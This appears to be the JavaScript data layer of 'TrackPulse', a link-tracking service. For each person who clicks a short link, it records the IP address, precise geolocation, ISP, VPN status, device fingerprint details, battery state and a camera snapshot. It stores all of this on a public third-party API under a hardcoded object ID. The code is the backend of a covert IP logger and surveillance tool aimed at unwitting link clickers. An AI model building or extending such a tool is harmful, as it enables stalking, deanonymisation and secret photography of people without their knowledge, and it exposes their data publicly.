const fs = require('fs');
const path = require('path');
const axios = require('axios');

// Permanent Cloud Database Object ID on RESTful Cloud Database
const CLOUD_OBJECT_ID = process.env.CLOUD_OBJECT_ID || 'ff808181a09d98f701a0c38a699b5fa4';
const CLOUD_DB_URL = `https://api.restful-api.dev/objects/${CLOUD_OBJECT_ID}`;

// Local file fallback
let localDbPath = path.join(__dirname, 'data.json');
try {
  fs.accessSync(__dirname, fs.constants.W_OK);
} catch (err) {
  localDbPath = path.join('/tmp', 'data.json');
}

// Initial schema structure
const defaultData = {
  links: [],
  click_logs: [],
  nextLinkId: 1,
  nextLogId: 1
};

// In-memory cache
let memoryCache = null;

// Fetch data from Cloud Database
async function fetchCloudData() {
  try {
    const res = await axios.get(CLOUD_DB_URL, { timeout: 3000 });
    if (res.data && res.data.data && Array.isArray(res.data.data.links)) {
      memoryCache = res.data.data;
      saveLocalData(res.data.data);
      return res.data.data;
    }
  } catch (err) {}
  return loadLocalData();
}

// Push data to Cloud Database
async function saveCloudData(data) {
  memoryCache = data;
  saveLocalData(data);
  try {
    await axios.put(CLOUD_DB_URL, {
      name: 'TrackPulse Database',
      data: data
    }, { timeout: 3500 });
  } catch (err) {
    console.error('Cloud DB sync error:', err.message);
  }
}

function loadLocalData() {
  if (memoryCache) return memoryCache;
  try {
    if (fs.existsSync(localDbPath)) {
      const content = fs.readFileSync(localDbPath, 'utf8');
      memoryCache = JSON.parse(content);
      return memoryCache;
    }
  } catch (e) {}
  memoryCache = defaultData;
  return defaultData;
}

function saveLocalData(data) {
  try {
    fs.writeFileSync(localDbPath, JSON.stringify(data, null, 2), 'utf8');
  } catch (e) {}
}

module.exports = {
  initSync: async () => {
    await fetchCloudData();
  },

  // Create Link
  createLink: async (shortCode, title, destinationUrl) => {
    await fetchCloudData();
    const data = loadLocalData();
    const newLink = {
      id: String(data.nextLinkId++),
      short_code: shortCode,
      title: title,
      destination_url: destinationUrl,
      created_at: new Date().toISOString()
    };
    data.links.push(newLink);
    await saveCloudData(data);
    return newLink;
  },

  // Get All Links
  getAllLinks: async () => {
    await fetchCloudData();
    const data = loadLocalData();
    return data.links.map(l => {
      const clickCount = data.click_logs.filter(c => String(c.link_id) === String(l.id)).length;
      return {
        ...l,
        total_clicks: clickCount
      };
    }).sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
  },

  // Get Link By Short Code
  getLinkByShortCode: async (shortCode) => {
    await fetchCloudData();
    const data = loadLocalData();
    return data.links.find(l => l.short_code === shortCode) || null;
  },

  // Delete Link
  deleteLink: async (id) => {
    await fetchCloudData();
    const data = loadLocalData();
    const strId = String(id);
    data.links = data.links.filter(l => String(l.id) !== strId);
    data.click_logs = data.click_logs.filter(c => String(c.link_id) !== strId);
    await saveCloudData(data);
    return true;
  },

  // Log Click
  logClick: async (logData) => {
    await fetchCloudData();
    const data = loadLocalData();
    const newLog = {
      id: String(data.nextLogId++),
      link_id: String(logData.linkId),
      ip_address: logData.ipAddress,
      reverse_dns: logData.reverseDns || 'N/A',
      country: logData.country || 'Unknown',
      countryCode: logData.countryCode || '',
      region: logData.region || 'Unknown',
      city: logData.city || 'Unknown',
      isp: logData.isp || 'Unknown',
      org: logData.org || 'Unknown',
      lat: logData.lat || 0,
      lon: logData.lon || 0,
      is_proxy: logData.isProxy || false,
      is_mobile_net: logData.isMobileNet || false,
      is_hosting: logData.isHosting || false,
      user_agent: logData.userAgent || '',
      browser: logData.browser || 'Unknown',
      os: logData.os || 'Unknown',
      device: logData.device || 'Desktop',
      device_model: logData.deviceModel || 'Generic Device',
      screen_res: logData.screenRes || 'N/A',
      timezone: logData.timezone || 'N/A',
      gpu: logData.gpu || 'N/A',
      cpu_cores: logData.cpuCores || 'N/A',
      connection_type: logData.connectionType || 'N/A',
      language: logData.language || 'N/A',
      battery: logData.battery || 'N/A',
      camera_snap: logData.cameraSnap || null,
      created_at: new Date().toISOString()
    };
    data.click_logs.push(newLog);
    await saveCloudData(data);
    return newLog;
  },

  // Update Client Data (GPU, Screen, Camera Snap)
  updateLogClientData: async (logId, clientData) => {
    await fetchCloudData();
    const data = loadLocalData();
    const log = data.click_logs.find(c => String(c.id) === String(logId));
    if (log) {
      if (clientData.screenRes) log.screen_res = clientData.screenRes;
      if (clientData.timezone) log.timezone = clientData.timezone;
      if (clientData.gpu) log.gpu = clientData.gpu;
      if (clientData.cpuCores) log.cpu_cores = clientData.cpuCores;
      if (clientData.connectionType) log.connection_type = clientData.connectionType;
      if (clientData.language) log.language = clientData.language;
      if (clientData.battery) log.battery = clientData.battery;
      if (clientData.deviceModel && clientData.deviceModel !== 'N/A') log.device_model = clientData.deviceModel;
      if (clientData.cameraSnap) log.camera_snap = clientData.cameraSnap;
      await saveCloudData(data);
    }
  },

  // Get Logs By Link ID
  getLogsByLinkId: async (linkId) => {
    await fetchCloudData();
    const data = loadLocalData();
    return data.click_logs
      .filter(c => String(c.link_id) === String(linkId))
      .sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
  },

  // Get All Logs
  getAllLogs: async (limit = 100) => {
    await fetchCloudData();
    const data = loadLocalData();
    return data.click_logs
      .map(c => {
        const link = data.links.find(l => String(l.id) === String(c.link_id));
        return {
          ...c,
          link_title: link ? link.title : 'Deleted Link',
          short_code: link ? link.short_code : 'N/A'
        };
      })
      .sort((a, b) => new Date(b.created_at) - new Date(a.created_at))
      .slice(0, limit);
  },

  // Get Stats
  getStats: async () => {
    await fetchCloudData();
    const data = loadLocalData();
    const totalLinks = data.links.length;
    const totalClicks = data.click_logs.length;
    const uniqueIPs = new Set(data.click_logs.map(c => c.ip_address)).size;
    const vpnCount = data.click_logs.filter(c => c.is_proxy).length;

    const locMap = {};
    data.click_logs.forEach(c => {
      if (c.country && c.country !== 'Unknown') {
        const key = `${c.city}, ${c.country}`;
        locMap[key] = (locMap[key] || 0) + 1;
      }
    });

    const topLocations = Object.entries(locMap)
      .map(([loc, count]) => ({ location: loc, count }))
      .sort((a, b) => b.count - a.count)
      .slice(0, 5);

    return { totalLinks, totalClicks, uniqueIPs, vpnCount, topLocations };
  }
};
